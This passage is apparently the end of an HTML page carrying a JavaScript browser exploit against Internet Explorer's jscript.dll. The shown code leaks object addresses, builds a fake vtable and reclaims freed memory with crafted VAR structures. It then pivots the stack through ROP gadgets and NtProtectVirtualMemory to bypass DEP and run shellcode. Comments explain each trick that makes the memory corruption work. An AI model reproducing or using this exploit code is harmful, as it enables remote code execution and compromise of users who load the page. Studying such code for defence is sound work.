                                                var ShellcodeAddress = LeakObjectAddress(LeakedVvalAddress, ShellcodeStr);                        
                                                var WritableStr = "";
                                                WritableStr += ConvertDwordArrayToBytes([0]);
                                                WritableStr += ConvertDwordArrayToBytes([ShellcodeAddress]);
                                                WritableStr += ConvertDwordArrayToBytes([ShellcodeLen]);
                                                WritableStr += ConvertDwordArrayToBytes([0]);
                                                WritableStr = WritableStr.substr(0, WritableStr.length);
                                                var WritableAddress = LeakObjectAddress(LeakedVvalAddress, WritableStr);
 
                                                var FakeVtablePaddingSize = 0x10000; // 64KB should be plenty to accomodate stack usage within NtProtectVirtualMemory and within shellcode (if it does not stack pivot on its own)
                                                var FakeVtable = CreateFakeVtable(FakeVtablePaddingSize, 0x200, NtProtectProxyStubAddress, ShellcodeAddress, RopGadgetSet, WritableAddress); // Doing this in a separate function is crucial for the AddressOf primitive to work properly. Concatenated vars in the same scope end up as a linked list of VARs
                                                FakeVtable = FakeVtable.substr(0, FakeVtable.length); // Nice trick to fix the AddressOf primitive. VARs created with multiple concats of other VARs end up as a linked list of VARs  
                                                // Re-claim NameList with mutable var set to region AFTER its own VAR in property name (as type 0x81). At this location in property name (+8 because of Type from generated VAR) the "object pointer" of the additional VAR (the fake vtable address) should be pointing at fake vtable BSTR +4 (to skip length
                                                var FakeVtableAddress = (LeakObjectAddress(LeakedVvalAddress, FakeVtable) + FakeVtablePaddingSize);
                                                reclaimUsingIndex(0, CreateVar32(0x81, LeakedVvalAddress + 0x30 + 16 + 8, 0) + CreateVar32(0, FakeVtableAddress, 0)); // VAR in VVAL will be a type 0x81 (not type 0x80) VAR. The 0x81 VAR pointer goes to the allocated (Array) object, the first 4 bytes of which are a vtable within jscript.dll
                                                alert("Executing stack pivot for DEP bypass at ");
                                                alert(RopGadgetSet.StackPivot.toString(16));
                                                typeof mutableVARinname;
                                                //alert("Clean return from shellcode");
                                            }     
                                            
                                        }
              
                                    }
                            
                                }
      
                            }
                            
                        }
                        
                    }
    
                } //if LeakedVVALasVAR check ending
            
            }   
        
        }
        main();
            
        
        </script>
    </head>
</html>
